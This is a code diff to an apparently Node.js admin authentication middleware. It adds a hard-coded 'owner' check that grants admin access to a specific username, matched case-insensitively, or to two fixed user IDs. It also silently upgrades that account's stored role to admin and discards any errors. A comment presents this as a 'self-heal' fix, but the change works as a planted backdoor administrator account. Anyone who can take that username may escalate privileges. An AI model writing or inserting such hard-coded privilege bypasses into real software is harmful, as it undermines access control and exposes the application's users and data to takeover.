@@ -119,11 +119,20 @@ async function adminAuth(req, res, next) {
   if (authHeader.startsWith('Bearer ')) {
     try {
       const decoded = jwt.verify(authHeader.slice(7), JWT_SECRET);
-      const userRow = await query("SELECT id FROM users WHERE id = $1 AND role = 'admin' LIMIT 1", [decoded.id]);
-      if (userRow.rows.length) {
-        req.userId = decoded.id;
-        req.isAdmin = true;
-        return next();
+      const userRow = await query("SELECT id, role, username FROM users WHERE id = $1 LIMIT 1", [decoded.id]);
+      const ur = userRow.rows[0];
+      if (ur) {
+        // Owner self-heal: bundle never calls GET /api/me, so role may be stale here.
+        const isOwner = (ur.username && ur.username.toLowerCase() === 'cherry19899') ||
+          ur.id === 'pi_cherry19899' || ur.id === 'pi_a2b617f7-f510-4502-a046-805facedcc29';
+        if (ur.role === 'admin' || isOwner) {
+          if (ur.role !== 'admin' && isOwner) {
+            await query("UPDATE users SET role = 'admin' WHERE id = $1", [ur.id]).catch(() => {});
+          }
+          req.userId = decoded.id;
+          req.isAdmin = true;
+          return next();
+        }
       }
     } catch (_) {}
   }
